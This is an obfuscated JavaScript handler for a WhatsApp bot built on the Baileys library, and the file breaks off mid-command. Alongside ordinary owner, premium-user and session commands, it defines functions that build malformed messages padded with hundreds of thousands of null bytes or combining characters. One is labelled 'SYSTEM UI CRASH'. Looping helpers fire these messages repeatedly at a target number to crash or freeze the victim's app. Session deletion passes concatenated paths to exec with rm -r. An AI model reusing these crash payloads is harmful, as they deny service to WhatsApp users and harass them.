require("./config");
const {
  delay,
  downloadContentFromMessage,
  makeInMemoryStore,
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType
} = require("@whiskeysockets/baileys");
const {
  isUrl,
  sleep,
  await,
  getBuffer,
  getGroupAdmins,
  fetchJson
} = require("./lib/myfunc.js");
const fs = require('fs');
const util = require("util");
const chalk = require("chalk");
const fetch = require("node-fetch");
const {
  exec,
  spawn,
  execSync
} = require('child_process');
ownerNamee = global.ownerName;
botNamee = global.botName;
Leccy_Auto_Typing = global.Auto_Typing;
Leccy_Auto_Recording = global.Auto_Recording;
Leccy_Auto_RecordType = global.Auto_RecordType;
Leccy_Auto_ReadPesan = global.Auto_ReadPesan;
global.locID = '1';
global.eggID = '15';
let premium = JSON.parse(fs.readFileSync("./db/premium.json"));
let ownerss = JSON.parse(fs.readFileSync('./db/owners.json'));
let treeimg = fs.readFileSync("./servers/logo.jpg");
mute_bot = false;
module.exports = async (_0x23b255, _0x38267e, _0x59b581) => {
  try {
    const {
      fromMe: _0x426611,
      isBaileys: _0x200f39,
      isQuotedMsg: _0x543ca8,
      quotedMsg: _0x333753,
      mentioned: _0x9c8669
    } = _0x38267e;
    if (_0x38267e.key && _0x38267e.key.remoteJid === "status@broadcast") {
      return;
    }
    const _0x12ce2b = getContentType(_0x38267e.message);
    const _0x42fa35 = _0x38267e.key.remoteJid;
    const _0x53090e = _0x12ce2b === 'conversation' && _0x38267e.message.conversation ? _0x38267e.message.conversation : _0x12ce2b == "imageMessage" && _0x38267e.message.imageMessage.caption ? _0x38267e.message.imageMessage.caption : _0x12ce2b == "documentMessage" && _0x38267e.message.documentMessage.caption ? _0x38267e.message.documentMessage.caption : _0x12ce2b == "videoMessage" && _0x38267e.message.videoMessage.caption ? _0x38267e.message.videoMessage.caption : _0x12ce2b == 'extendedTextMessage' && _0x38267e.message.extendedTextMessage.text ? _0x38267e.message.extendedTextMessage.text : _0x12ce2b == "buttonsResponseMessage" && _0x38267e.message.buttonsResponseMessage.selectedButtonId ? _0x38267e.message.buttonsResponseMessage.selectedButtonId : _0x12ce2b == "templateButtonReplyMessage" && _0x38267e.message.templateButtonReplyMessage.selectedId ? _0x38267e.message.templateButtonReplyMessage.selectedId : '';
    const _0x185059 = /^[°•π÷●¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(_0x53090e) ? _0x53090e.match(/^[°•π÷●¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.';
    const _0x2818bf = _0x53090e.replace(_0x185059, '').trim().split(/ +/).shift().toLowerCase();
    const _0x3bedf8 = _0x53090e.trim().split(/ +/).slice(0x1);
    const _0x4ae346 = _0x42fa35.endsWith("@g.us");
    const _0x460352 = _0x23b255.user.id.split(':')[0x0];
    const _0x5e0c1d = _0x38267e.key.fromMe ? _0x23b255.user.id.split(':')[0x0] + "@s.whatsapp.net" || _0x23b255.user.id : _0x38267e.key.participant || _0x38267e.key.remoteJid;
    const _0x518b7a = _0x5e0c1d.split('@')[0x0];
    const _0x3424fb = _0x460352.includes(_0x518b7a);
    const _0x585723 = global.devNumber.includes(_0x518b7a);
    const _0x1eaf88 = [global.devNumber, ...premium].includes(_0x518b7a);
    const _0x5290c9 = ownerss.includes(_0x518b7a);
    const _0x3e6ad6 = _0x4ae346 ? await _0x23b255.groupMetadata(_0x42fa35) : '';
    const _0x39e19d = _0x4ae346 ? _0x3e6ad6.subject : '';
    const _0x28b967 = _0x4ae346 ? _0x3e6ad6.participants : '';
    const _0x117527 = _0x4ae346 ? getGroupAdmins(_0x28b967) : '';
    const _0xcf285e = _0x117527.includes(_0x460352 + "@s.whatsapp.net") || false;
    const _0xa7e0c0 = _0x117527.includes(_0x5e0c1d) || false;
    const _0x2fcec4 = function (_0x2f4a85) {
      var _0x2f4a85 = Number(_0x2f4a85);
      var _0x3c8caa = Math.floor(_0x2f4a85 / 86400);
      var _0x2082fe = Math.floor(_0x2f4a85 % 86400 / 0xe10);
      var _0x4e63a5 = Math.floor(_0x2f4a85 % 0xe10 / 0x3c);
      var _0x5b2e06 = Math.floor(_0x2f4a85 % 0x3c);
      var _0x3cdff4 = _0x3c8caa > 0x0 ? _0x3c8caa + (_0x3c8caa == 0x1 ? " Hari, " : " Hari, ") : '';
      var _0x638e7b = _0x2082fe > 0x0 ? _0x2082fe + (_0x2082fe == 0x1 ? " Jam, " : " Jam, ") : '';
      var _0x15c3ca = _0x4e63a5 > 0x0 ? _0x4e63a5 + (_0x4e63a5 == 0x1 ? " Menit, " : " Menit, ") : '';
      var _0x1fc4ce = _0x5b2e06 > 0x0 ? _0x5b2e06 + (_0x5b2e06 == 0x1 ? " Detik" : " Detik") : '';
      return _0x3cdff4 + _0x638e7b + _0x15c3ca + _0x1fc4ce;
    };
    const _0x404955 = {
      'key': {
        'fromMe': false,
        'participant': '0@s.whatsapp.net',
        'remoteJid': "status@broadcast"
      },
      'message': {
        'extendedTextMessage': {
          'text': '' + _0x2fcec4(process.uptime())
        }
      }
    };
    const _0x25b16a = async _0x1a96fd => {
      await _0x23b255.sendMessage(_0x42fa35, {
        'text': _0x1a96fd
      }, {
        'quoted': _0x38267e
      });
    };
    const _0x13a24e = async _0x5c003c => {
      await _0x23b255.sendMessage(_0x42fa35, {
        'text': _0x5c003c
      }, {
        'quoted': _0x38267e
      });
    };
    const _0x4159f4 = async _0x3c7834 => {
      _0x23b255.sendMessage(_0x42fa35, {
        'react': {
          'text': _0x3c7834,
          'key': _0x38267e.key
        }
      });
    };
    const _0x5110f5 = async (_0x6f6631, _0x21106f = []) => {
      _0x23b255.sendMessage(_0x42fa35, {
        'text': _0x6f6631,
        'mentions': _0x21106f
      }, {
        'quoted': _0x38267e
      });
    };
    const _0x561604 = async (_0x5b0042, _0x5ab3ed = []) => {
      _0x23b255.sendMessage(_0x42fa35, {
        'text': _0x5b0042,
        'mentions': _0x5ab3ed
      }, {
        'quoted': _0x404955
      });
    };
    const _0x3c9814 = async (_0x343e57, _0x5a1547 = []) => {
      _0x23b255.sendMessage(_0x42fa35, {
        'image': treeimg,
        'caption': _0x343e57,
        'mentions': _0x5a1547
      }, {
        'quoted': _0x38267e
      });
    };
    const _0xa77d0c = _0x14c1aa => {
      let _0x1c75ac = '';
      const _0x120446 = "1234567890".length;
      for (let _0x3e295d = 0x0; _0x3e295d < _0x14c1aa; _0x3e295d++) {
        _0x1c75ac += "1234567890".charAt(Math.floor(Math.random() * _0x120446));
      }
      return _0x1c75ac;
    };
    function _0x106d54(_0x58d2e9, _0x2af935 = [], _0x82c57f) {
      if (_0x82c57f == null || _0x82c57f == undefined || _0x82c57f == false) {
        let _0x2cdfa3 = _0x23b255.sendMessage(_0x42fa35, {
          'text': _0x58d2e9,
          'mentions': _0x2af935
        }, {
          'quoted': _0x38267e
        });
        return _0x2cdfa3;
      } else {
        let _0xfd94d1 = _0x23b255.sendMessage(_0x42fa35, {
          'text': _0x58d2e9,
          'mentions': _0x2af935
        }, {
          'quoted': _0x38267e
        });
        return _0xfd94d1;
      }
    }
    function _0x49d796(_0x88a887, _0x162826 = [], _0x11efc7) {
      if (_0x11efc7 == null || _0x11efc7 == undefined || _0x11efc7 == false) {
        let _0x4cb611 = _0x23b255.sendMessage(_0x42fa35, {
          'text': _0x88a887,
          'mentions': _0x162826
        }, {
          'quoted': _0x38267e
        });
        return _0x4cb611;
      } else {
        let _0x2b4794 = _0x23b255.sendMessage(_0x42fa35, {
          'text': _0x88a887,
          'mentions': _0x162826
        }, {
          'quoted': _0x38267e
        });
        return _0x2b4794;
      }
    }
    async function _0x302785(_0x3932e0) {
      var _0x1cca8b = generateWAMessageFromContent(_0x3932e0, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(0xd6d8),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0x3932e0
      });
      await _0x23b255.relayMessage(_0x3932e0, _0x1cca8b.message, {
        'participant': {
          'jid': _0x3932e0
        },
        'messageId': _0x1cca8b.key.id
      });
    }
    async function _0x228b73(_0x10e970) {
      var _0x1e3ff4 = generateWAMessageFromContent(_0x10e970, proto.Message.fromObject({
        'listMessage': {
          'title': "𝖘𝖙𝖗𝖆𝖛𝖆𝕭𝖚𝖌" + "\0".repeat(0xf423f),
          'footerText': '.',
          'description': '.',
          'buttonText': null,
          'listType': 0x2,
          'productListInfo': {
            'productSections': [{
              'title': "anjay",
              'products': [{
                'productId': '4392524570816732'
              }]
            }],
            'productListHeaderImage': {
              'productId': "4392524570816732",
              'jpegThumbnail': null
            },
            'businessOwnerJid': '0@s.whatsapp.net'
          }
        },
        'footer': 'puki',
        'contextInfo': {
          'expiration': 0x93a80,
          'ephemeralSettingTimestamp': "1679959486",
          'entryPointConversionSource': "global_search_new_chat",
          'entryPointConversionApp': "whatsapp",
          'entryPointConversionDelaySeconds': 0x9,
          'disappearingMode': {
            'initiator': "INITIATED_BY_ME"
          }
        },
        'selectListType': 0x2,
        'product_header_info': {
          'product_header_info_id': 0x4433e2e130,
          'product_header_is_rejected': true
        }
      }), {
        'userJid': _0x10e970
      });
      await _0x23b255.relayMessage(_0x10e970, _0x1e3ff4.message, {
        'participant': {
          'jid': _0x10e970
        },
        'messageId': _0x1e3ff4.key.id
      });
    }
    async function _0x55469c(_0x40db74) {
      var _0x2aafd6 = generateWAMessageFromContent(_0x40db74, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': "Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½" + "ê¦¾".repeat(0xc350),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0x40db74
      });
      await _0x23b255.relayMessage(_0x40db74, _0x2aafd6.message, {
        'participant': {
          'jid': _0x40db74
        },
        'messageId': _0x2aafd6.key.id
      });
    }
    async function _0x277b56(_0xf06096) {
      var _0x35bfe0 = generateWAMessageFromContent(_0xf06096, proto.Message.fromObject({
        'listMessage': {
          'title': "SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸" + "\0".repeat(0xe09c0),
          'footerText': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
          'description': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
          'buttonText': null,
          'listType': 0x2,
          'productListInfo': {
            'productSections': [{
              'title': "lol",
              'products': [{
                'productId': "4392524570816732"
              }]
            }],
            'productListHeaderImage': {
              'productId': "4392524570816732",
              'jpegThumbnail': null
            },
            'businessOwnerJid': "0@s.whatsapp.net"
          }
        },
        'footer': "lol",
        'contextInfo': {
          'expiration': 0x927c0,
          'ephemeralSettingTimestamp': '1679959486',
          'entryPointConversionSource': "global_search_new_chat",
          'entryPointConversionApp': "whatsapp",
          'entryPointConversionDelaySeconds': 0x9,
          'disappearingMode': {
            'initiator': 'INITIATED_BY_ME'
          }
        },
        'selectListType': 0x2,
        'product_header_info': {
          'product_header_info_id': 0x4433e2e130,
          'product_header_is_rejected': false
        }
      }), {
        'userJid': _0xf06096
      });
      await _0x23b255.relayMessage(_0xf06096, _0x35bfe0.message, {
        'participant': {
          'jid': _0xf06096
        },
        'messageId': _0x35bfe0.key.id
      });
    }
    async function _0x26d393(_0x21bd00) {
      var _0x1ad952 = generateWAMessageFromContent(_0x21bd00, proto.Message.fromObject({
        'listMessage': {
          'title': "SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸" + "\0".repeat(0xe09c0),
          'footerText': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
          'description': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
          'buttonText': null,
          'listType': 0x2,
          'productListInfo': {
            'productSections': [{
              'title': "lol",
              'products': [{
                'productId': "4392524570816732"
              }]
            }],
            'productListHeaderImage': {
              'productId': '4392524570816732',
              'jpegThumbnail': null
            },
            'businessOwnerJid': "0@s.whatsapp.net"
          }
        },
        'footer': 'lol',
        'contextInfo': {
          'expiration': 0x927c0,
          'ephemeralSettingTimestamp': '1679959486',
          'entryPointConversionSource': 'global_search_new_chat',
          'entryPointConversionApp': "whatsapp",
          'entryPointConversionDelaySeconds': 0x9,
          'disappearingMode': {
            'initiator': "INITIATED_BY_ME"
          }
        },
        'selectListType': 0x2,
        'product_header_info': {
          'product_header_info_id': 0x4433e2e130,
          'product_header_is_rejected': false
        }
      }), {
        'userJid': _0x21bd00
      });
      await _0x23b255.relayMessage(_0x21bd00, _0x1ad952.message, {
        'messageId': _0x1ad952.key.id
      });
    }
    async function _0x4bd7c8(_0x150883) {
      var _0x39df14 = generateWAMessageFromContent(_0x150883, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'title': '',
                'subtitle': "𝕾𝖙𝖗𝖆𝖛𝖆𝕺𝖋𝖈"
              },
              'body': {
                'text': "𝕾𝖙𝖗𝖆𝖛𝖆 𝕭𝖚𝖌"
              },
              'footer': {
                'text': "𝖂𝖍𝖆𝖙𝖘𝖆𝖕𝖕"
              },
              'nativeFlowMessage': {
                'buttons': [{
                  'name': "cta_url",
                  'buttonParamsJson': "{ display_text : '𝕾𝖙𝖗𝖆𝖛𝖆𝕭𝖚𝖌', url : , merchant_url :  }"
                }, {
                  'name': "cta_url",
                  'buttonParamsJson': "{ display_text : '𝕾𝖙𝖗𝖆𝖛𝖆𝕭𝖚𝖌', url : , merchant_url :  }"
                }, {
                  'name': "cta_url",
                  'buttonParamsJson': "{ display_text : '𝕾𝖙𝖗𝖆𝖛𝖆𝕭𝖚𝖌', url : , merchant_url :  }"
                }],
                'messageParamsJson': ''.repeat(0xf423f)
              }
            }
          }
        }
      }), {
        'userJid': _0x150883
      });
      await _0x23b255.relayMessage(_0x150883, _0x39df14.message, {
        'participant': {
          'jid': _0x150883
        },
        'messageId': _0x39df14.key.id
      });
    }
    async function _0x5dbd71(_0xefa2f1) {
      var _0x52eea9 = generateWAMessageFromContent(_0xefa2f1, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'title': '',
                'subtitle': "𝕾𝖙𝖗𝖆𝖛𝖆𝕺𝖋𝖈"
              },
              'body': {
                'text': "𝕾𝖙𝖗𝖆𝖛𝖆 𝕭𝖚𝖌"
              },
              'footer': {
                'text': '𝖂𝖍𝖆𝖙𝖘𝖆𝖕𝖕'
              },
              'nativeFlowMessage': {
                'buttons': [{
                  'name': "cta_url",
                  'buttonParamsJson': "{ display_text : '𝕾𝖙𝖗𝖆𝖛𝖆𝕭𝖚𝖌', url : , merchant_url :  }"
                }, {
                  'name': "cta_url",
                  'buttonParamsJson': "{ display_text : '𝕾𝖙𝖗𝖆𝖛𝖆𝕭𝖚𝖌', url : , merchant_url :  }"
                }, {
                  'name': "cta_url",
                  'buttonParamsJson': "{ display_text : '𝕾𝖙𝖗𝖆𝖛𝖆𝕭𝖚𝖌', url : , merchant_url :  }"
                }],
                'messageParamsJson': ''.repeat(0xf423f)
              }
            }
          }
        }
      }), {
        'userJid': _0xefa2f1
      });
      await _0x23b255.relayMessage(_0xefa2f1, _0x52eea9.message, {
        'messageId': _0x52eea9.key.id
      });
    }
    async function _0x149a67(_0x3a23ed) {
      let _0x4f0a20 = generateWAMessageFromContent(_0x3a23ed, {
        'viewOnceMessage': {
          'message': {
            'messageContextInfo': {
              'deviceListMetadata': {},
              'deviceListMetadataVersion': 0x2
            },
            'interactiveMessage': proto.Message.InteractiveMessage.create({
              'body': proto.Message.InteractiveMessage.Body.create({
                'text': ''
              }),
              'footer': proto.Message.InteractiveMessage.Footer.create({
                'text': 'ྦྷ'.repeat(0x3d090)
              }),
              'header': proto.Message.InteractiveMessage.Header.create({
                'title': '',
                'subtitle': '',
                'hasMediaAttachment': false
              }),
              'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                'buttons': [{
                  'name': "cta_url",
                  'buttonParamsJson': "{ display_text : \" \", url : , merchant_url : \" \"}"
                }],
                'messageParamsJson': "\0".repeat(0x186a0)
              })
            })
          }
        }
      }, {});
      _0x23b255.relayMessage(_0x3a23ed, _0x4f0a20.message, {
        'messageId': _0x4f0a20.key.id
      });
    }
    async function _0xc4f2fd(_0x5b145e) {
      var _0x5866ea = generateWAMessageFromContent(_0x5b145e, proto.Message.fromObject({
        'extendedTextMessage': {
          'text': "𝕾𝖙𝖗𝖆𝖛𝖆-𝕭𝖚𝖌",
          'contextInfo': {
            'stanzaId': _0x5b145e,
            'participant': _0x5b145e,
            'quotedMessage': {
              'conversation': "؂ن؃؄ٽ؂ن؃؄ٽ".repeat(0x9c40)
            },
            'disappearingMode': {
              'initiator': "CHANGED_IN_CHAT",
              'trigger': "CHAT_SETTING"
            }
          },
          'inviteLinkGroupTypeV2': "DEFAULT"
        }
      }), {
        'userJid': _0x5b145e
      });
      await _0x23b255.relayMessage(_0x5b145e, _0x5866ea.message, {
        'participant': {
          'jid': _0x5b145e
        },
        'messageId': _0x5866ea.key.id
      });
    }
    async function _0xd89dc(_0x4f6a4c) {
      await _0x23b255.relayMessage(_0x4f6a4c, {
        'paymentInviteMessage': {
          'serviceType': 'LECCY',
          'expiryTimestamp': Date.now() + 86400000000
        }
      }, {
        'participant': {
          'jid': _0x4f6a4c
        }
      });
    }
    async function _0x10bc24(_0x2c055f, _0x41765b) {
      for (let _0xb5971f = 0x0; _0xb5971f < _0x41765b; _0xb5971f++) {
        _0x228b73(_0x2c055f);
        _0x302785(_0x2c055f);
        _0x4bd7c8(_0x2c055f);
        _0x277b56(_0x2c055f);
        _0x55469c(_0x2c055f);
        _0x4bd7c8(_0x2c055f);
      }
    }
    async function _0x10868e(_0x34b18c, _0xee8aba) {
      for (let _0x2cab6c = 0x0; _0x2cab6c < _0xee8aba; _0x2cab6c++) {
        _0xc4f2fd(_0x34b18c);
        _0xd89dc(_0x34b18c);
        _0xc4f2fd(_0x34b18c);
        _0xd89dc(_0x34b18c);
      }
    }
    async function _0x6a2258(_0x146c70, _0x3ebd41) {
      for (let _0x20a8cf = 0x0; _0x20a8cf < _0x3ebd41; _0x20a8cf++) {
        _0x26d393(_0x146c70);
        _0x149a67(_0x146c70);
        _0x5dbd71(_0x146c70);
      }
    }
    if (Leccy_Auto_Typing) {
      await delay(0x1f4);
      _0x23b255.sendPresenceUpdate("composing", _0x42fa35);
    }
    if (Leccy_Auto_Recording) {
      await delay(0x1f4);
      _0x23b255.sendPresenceUpdate("recording", _0x42fa35);
    }
    if (Leccy_Auto_ReadPesan) {
      await delay(0x1f4);
      _0x23b255.readMessages([_0x38267e.key]);
    }
    if (mute_bot) {
      if (_0x4ae346) {
        return;
      }
      if (!_0x585723 && !_0x5290c9 && !_0x3424fb) {
        return;
      }
    }
    if (_0x4ae346) {
      if (!_0x585723 && !_0x5290c9 && !_0x3424fb && !_0x1eaf88) {
        return;
      }
      console.log(chalk.bgBlack(chalk.redBright("\n===========================================\n")));
      console.log(chalk.black(chalk.white("Group Chat :")));
      console.log(chalk.black(chalk.cyan("- Message :")), chalk.black(chalk.greenBright(_0x53090e || _0x12ce2b)) + "\n" + chalk.magenta("- From :"), chalk.green(_0x38267e.pushName), chalk.yellow(_0x5e0c1d.split('@')[0x0]) + "\n" + chalk.blueBright("=> in"), chalk.green(_0x39e19d, _0x42fa35));
    } else {
      if (!_0x585723 && !_0x5290c9 && !_0x3424fb && !_0x1eaf88) {
        return;
      }
      console.log(chalk.bgBlack(chalk.redBright("\n===========================================\n")));
      console.log(chalk.black(chalk.white("Private Chat :")));
      console.log(chalk.bgBlack(chalk.cyan("- Message :")), chalk.black(chalk.greenBright(_0x53090e || _0x12ce2b)) + "\n" + chalk.magenta("- From :"), chalk.green(_0x38267e.pushName), chalk.yellow(_0x5e0c1d.split('@')[0x0]) + "\n");
    }
    switch (_0x2818bf) {
      case "runtime":
        if (!_0x585723) {
          return _0x25b16a("This feature can only be used by the owner");
        }
        _0x25b16a(_0x2fcec4(process.uptime()));
        break;
      case "mute":
        if (!_0x585723) {
          return _0x25b16a("This feature can only be used by the owner");
        }
        if (mute_bot == true) {
          return _0x25b16a("*The bot was in self mode before*");
        }
        mute_bot = true;
        _0x25b16a("*Successfully Activated Self Mode!*");
        break;
      case "unmute":
        if (!_0x585723) {
          return _0x25b16a("This feature can only be used by the owner");
        }
        if (mute_bot == false) {
          return _0x25b16a("*The bot has been in self mode before*");
        }
        mute_bot = false;
        _0x25b16a("*successfully Turned Off Self Mode!*");
        break;
      case "stopjadibot":
        if (!fs.existsSync("./database/jadibot/" + _0x5e0c1d.split('@')[0x0])) {
          return _0x25b16a("*Maaf, Kamu Tidak Terdaftar Jadibot!*");
        }
        exec("rm -r database/jadibot/" + _0x5e0c1d.split('@')[0x0]);
        _0x25b16a("*succesfully delete session ✓*");
        break;
      case 'del-sesi':
        {
          if (!q) {
            return _0x25b16a("EX: .d-sesi 628xxxx");
          }
          if (!_0x585723) {
            return _0x25b16a("This feature can only be used by the owner");
          }
          num = q.replace(/[^0-9]/g, '');
          if (!fs.existsSync("./database/jadibot/" + num)) {
            return _0x25b16a("*Maaf, Nomor itu Tidak Terdaftar Jadibot!*");
          }
          exec("rm -r database/jadibot/" + num);
          mensesi = num + '@s.whatsapp.net';
          _0x106d54("*succesfully delete session* @" + mensesi.split('@')[0x0], [mensesi]);
        }
        break;
      case "resetjadibot":
        if (!_0x585723) {
          return _0x25b16a("This feature can only be used by the owner");
        }
        exec("rm -r database/jadibot/" + _0x5e0c1d.split('@')[0x0]);
        _0x25b16a("*succesfully restart session ✓*");
        await sleep(0xbb8);
        process.exit();
        break;
      case "listjadibot":
        if (!_0x585723) {
          return _0x25b16a("This feature can only be used by the owner");
        }
        xxjdb = 0x1;
        const {
          jadibot: _0x3b9aeb,
          conns: _0x4ebbfa
        } = require("./lib/jadibot");
        try {
          let _0x17835f = [...new Set([...global.conns.filter(_0x359b4c => _0x359b4c.user).map(_0x1acca9 => _0x1acca9.user)])];
          te = "▬▭▬▭▬▭▬▭▬▭▬▭\n*LISTJADIBOT-TREE*\n*Total Users* : " + _0x17835f.length + "\n▬▭▬▭▬▭▬▭▬▭▬▭\n";
          for (let _0x203c52 of _0x17835f) {
            y = await _0x23b255.decodeJid(_0x203c52.id);
            te += "*⭔UserID* : " + ('' + xxjdb++) + "\n";
            te += "*⭔Number* : @" + y.split('@')[0x0] + "\n▬▭▬▭▬▭▬▭▬▭▬▭\n";
          }
          _0x23b255.sendTextWithMentions(_0x42fa35, te, _0x38267e);
        } catch (_0x233dd1) {
          _0x25b16a("Belum Ada User Yang Jadibot");
        }
        break;
      case 'jadibot':
        {
          if (!q) {
            return _0x25b16a("EX: .jadibot 628xxxx");
          }
          if (!_0x585723) {
            return _0x25b16a("This feature can only be used by the owner");
          }
          num = q.replace(/[^0-9]/g, '');
          myown = _0x460352 + "@s.whatsapp.net";
          mynum = num + "@s.whatsapp.net";
          if (fs.existsSync('./database/jadibot/' + num)) {
            return _0x106d54("*mohon maaf* @" + mynum.split('@')[0x0] + " ^_^\n*session users masih terdaftar.*\n\n*silahkan ketik* .stopjadibot\n*untuk menghapus session ✓*", [mynum]);
          }
          _0x25b16a("*We are processing your request.*");
          const {
            jadibot: _0x4ecb33,
            conns: _0x13d266
          } = require('./lib/jadibot');
          await sleep(0xdac);
          txtt = "*MASUKKAN CODE PAIRING DIBAWAH INI*\n*UNTUK MENJADI BOT SEMENTARA ✓*\n\n1. Klik titik tiga di pojok kanan atas\n2. Ketuk perangkat tertaut\n3. Ketuk tautkan perangkat\n4. Ketuk tautkan dengan nomor telepon saja\n5. Masukkan code pairing dibawah ini\n\n*Code Pairing :* `" + global.codepairing + "`\n\n*Note:*\n_Code dapat expired kapan saja._\n_Jika code error silahkan ketik_ ⇩\n\n========[  !stopjadibot  ]========";
          _0x23b255.sendMessage(mynum, {
            'text': txtt
          }).then(() => _0x23b255.sendMessage(_0x42fa35, {
            'text': "*Succesfully Send Pairing Code* @" + mynum.split('@')[0x0],
            'mentions': [mynum]
          })).then(() => _0x23b255.sendMessage(_0x5e0c1d, {
            'text': global.codepairing
          }, {
            'quoted': _0x38267e
          }));
        }
        break;
      case "listprem":
        {
          if (!_0x585723 && !_0x5290c9 && !_0x3424fb) {
            return;
          }
          let _0x548d39 = JSON.parse(fs.readFileSync("./db/premium.json"));
          if (_0x548d39.length == 0x0) {
            return _0x25b16a("*there are not Premium Users in the database*");
          }
          var _0x4ae258 = "_*LIST USER PREMIUM*_\n*Total User :* " + _0x548d39.length + "\n\n";
          var _0x1c31ec = 0x1;
          for (let _0x6d0088 of _0x548d39) {
            _0x4ae258 += "Users : " + _0x1c31ec++ + "\nNumber : @" + _0x6d0088 + "\n\n";
          }
          _0x23b255.sendTextWithMentions(_0x42fa35, _0x4ae258, _0x38267e);
        }
        break;
      case "addprem":
        {
          if (!_0x585723 && !_0x5290c9 && !_0x3424fb) {
            return;
          }
          if (!_0x3bedf8[0x0]) {
            return _0x25b16a("Use " + (_0x185059 + _0x2818bf) + " number\nExample " + (_0x185059 + _0x2818bf) + " 628xxxxx");
          }
          bnnd = q.replace(/[^0-9]/g, '');
          let _0x2184b5 = await _0x23b255.onWhatsApp(bnnd + "@s.whatsapp.net");
          if (_0x2184b5.length == 0x0) {
            return _0x25b16a("_Enter A Valid And Registered Number On WhatsApp!!_");
          }
          if (premium.includes(bnnd)) {
            return _0x25b16a("_Nomor Tersebut Sudah Premium !!_");
          }
          premium.push(bnnd);
          fs.writeFileSync("./db/premium.json", JSON.stringify(premium));
          let _0x4001d6 = bnnd + "@s.whatsapp.net";
          _0x106d54("*Success Added @" + _0x4001d6.split('@')[0x0] + " To the Premium Users Database*", [_0x4001d6]);
          await sleep(0x9c4);
          _0x23b255.sendMessage(_0x4001d6, {
            'text': "*Congratulations users, you can now use premium features*"
          });
        }
        break;
      case 'delprem':
        {
          if (!_0x585723 && !_0x5290c9 && !_0x3424fb) {
            return;
          }
          if (!_0x3bedf8[0x0]) {
            return _0x25b16a("Use " + (_0x185059 + _0x2818bf) + " number\nExample " + (_0x185059 + _0x2818bf) + " 628xxxxx");
          }
          ya = q.replace(/[^0-9]/g, '');
          unp = premium.indexOf(ya);
          if (!premium.includes(ya)) {
            return _0x25b16a("_Gagal Menghapus Dari Database, Nomor Tersebut Bukan Users Premium!!_");
          }
          premium.splice(unp, 0x1);
          fs.writeFileSync('./db/premium.json', JSON.stringify(premium));
          let _0x48b9e5 = ya + "@s.whatsapp.net";
          _0x106d54("*Deleting Success @" + _0x48b9e5.split('@')[0x0] + " In the Users Premium database*", [_0x48b9e5]);
          await sleep(0x9c4);
          _0x23b255.sendMessage(_0x48b9e5, {
            'text': "*Well, it's a shame, you can no longer access premium features because they were deleted*"
          });
        }
        break;
      case 'listown':
        {
          if (!_0x585723 && !_0x5290c9 && !_0x3424fb) {
            return;
          }
          let _0x751e3a = JSON.parse(fs.readFileSync('./db/owners.json'));
          if (_0x751e3a.length == 0x0) {
            return _0x25b16a("*there are not Premium Users in the database*");
          }
          var _0x4ae258 = "_*LIST USER PREMIUM*_\n*Total User :* " + _0x751e3a.length + "\n\n";
          var _0x1c31ec = 0x1;
          for (let _0x2d3426 of _0x751e3a) {
            _0x4ae258 += "Users : " + _0x1c31ec++ + "\nNumber : @" + _0x2d3426 + "\n\n";
          }
          _0x23b255.sendTextWithMentions(_0x42fa35, _0x4ae258, _0x38267e);
        }
        break;
      case "addown":
        {
          if (!_0x585723 && !_0x3424fb) {
            return;
          }
          if (!_0x3bedf8[0x0]) {
            return _0x25b16a("Use " + (_0x185059 + _0x2818bf) + " number\nExample " + (_0x185059 + _0x2818bf) + " 628xxxxx");
          }
          bnnd = q.replace(/[^0-9]/g, '');
          let _0x452fde = await _0x23b255.onWhatsApp(bnnd + "@s.whatsapp.net");
          if (_0x452fde.length == 0x0) {
            return _0x25b16a("_Enter A Valid And Registered Number On WhatsApp!!_");
          }
          if (ownerss.includes(bnnd)) {
            return _0x25b16a("_Nomor Tersebut Sudah Menjadi Owners !!_");
          }
          ownerss.push(bnnd);
          fs.writeFileSync("./db/owners.json", JSON.stringify(ownerss));
          let _0x51cf42 = bnnd + "@s.whatsapp.net";
          _0x106d54("*Success Added @" + _0x51cf42.split('@')[0x0] + " To the Owners Users Database*", [_0x51cf42]);
          await sleep(0x9c4);
          _0x23b255.sendMessage(_0x51cf42, {
            'text': "*Congratulations users, you can now use owners features*"
          });
        }
        break;
      case 'delown':
        {
          if (!_0x585723 && !_0x3424fb) {
            return;
          }
          if (!_0x3bedf8[0x0]) {
            return _0x25b16a("Use " + (_0x185059 + _0x2818bf) + " number\nExample " + (_0x185059 + _0x2818bf) + " 628xxxxx");
          }
          ya = q.replace(/[^0-9]/g, '');
          unp = ownerss.indexOf(ya);
